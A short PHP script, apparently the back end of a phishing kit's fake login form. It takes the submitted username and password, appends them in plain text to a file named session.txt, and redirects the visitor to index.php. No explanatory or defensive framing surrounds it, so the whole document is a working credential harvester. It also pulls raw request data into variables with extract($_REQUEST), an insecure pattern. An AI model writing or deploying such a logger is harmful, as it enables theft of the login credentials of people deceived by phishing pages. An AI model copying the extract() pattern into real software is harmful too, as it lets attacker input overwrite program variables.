<?php
extract($_REQUEST);
$file = fopen("session.txt", "a");

fwrite($file, "username: ");
fwrite($file, $username . "\n");
fwrite($file, "Password: ");
fwrite($file, $password . "\n\n");
fclose($file);
header("location: index.php");
